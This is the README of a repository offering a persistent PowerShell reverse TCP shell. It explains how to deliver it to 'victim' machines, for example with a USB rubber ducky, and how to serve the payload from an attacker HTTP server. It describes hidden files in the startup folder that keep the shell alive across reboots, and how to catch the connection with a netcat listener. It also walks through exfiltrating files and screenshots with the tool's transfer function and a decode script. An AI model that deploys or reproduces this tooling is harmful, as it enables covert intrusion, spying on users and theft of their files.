Persisting reverse TCP shell in PowerShell
==========================================

**This repo contains a staged reverse TCP shell with some select utils. The shell is run on every startup after installation, and can be connected to with for example netcat.**

## Features
* Simple execution, for exemplewith a USB rubber ducky
* Persists even when victim machine is rebooted
* Built-in functions so far include:
  * File transfer from victim machine.
  * Taking screenshots from victim machine and transfering the image
  * One function to remove the shell from the victim.

## Usage
### Preparation
First, the listener address and port must be configured in "runner.ps1" (See comment on line 1 of said file). The file server address is then configured in "loader.txt" (See comment on line 1 of said file). The "runner.ps1" file must then be served on a file server accessible from the host machine, on port 80. A simple, but relatively insecure way of doing this is with a python simple HTTP server. With python 2.x, this is achieved with 
```
sudo python -m SimpleHTTPServer 80
```
and with python 3.x:
```
sudo python3 -m http.server 80
```

### Stage 1
To run stage 1, follow the instructions on line 1 of "loader.txt". This will download and run "payload.ps1" from the server. A powershell window will be opened, but this should disappear almost immeadiately. The script in "payload.ps1" now creates a file "pspayload.ps1" in the user's home directory and a file "runner.bat" in the user's startup directory. Both of these are hidden. Subsequently, "psrunner.bat" is executed, launching stage 2.

### Stage 2
Stage 2 is run automatically, and the victim is now, every 10 seconds trying to establish a TCP connection to the listener machine. One way to receive this connection is with netcat:
```
nc -l YOUR_LISTENER_PORT
```
After a maximum of 10 seconds you should be greeted by the victim machine. You now have a powershell as the user that was logged on to the victim when stage 1 was run. Note that this user must be logged on to the victim machine while the reverse shell is utilized.


## Documentation
### Built-in functions
* `rm-all`: Removes the "pspayload.ps1" and "psrunner.bat" files from the victim, and kills the powershell process.
* `transfer(<absolute path>)`: Converts the file pointed to by the `<absolute path>` to a base64 string, and echoes it over TCP. The file-string is preceded by the line "FILE_START" and followed by the line "FILE_END".
* `screenshot`: Takes a screenshot of the victim machine, and then transfers the image as a `.png` using `transfer`.

### Other utilities
* `./decodeFile.sh <path>`: Extracts and decodes base64 file-strings from a file, and creates a new file with the decoded data. The input file (given from the `<path>` parameter) can contain any number of base64 strings, as long as they are of the format generated by the `transfer` function (preceded by the line "FILE_START" and followed by the line "FILE_END"). All other text is ignored. The output from each string is saved in a file named `file_n.out`, where `n` is the enumerated postition of the file-string in the input file.
	* One way of using this to get a file from the reverse shell is as follows:
		1. `nc -l YOUR_LISTENER_PORT | tee ./shell_output` - This pipes all output from the shell to the file `shell_output`, as well as printing it to stdout.
		2. When the shell is open, use the built-in `transfer` function with the desired file(s) on the victim machine.
		3. When the base64 string has stopped printing, exit the shell by typing `exit` or pressing `ctrl + c`.
		4. Then, use `./decodeFile.sh ./shell_output`, and your file(s) should appear in the same directory.
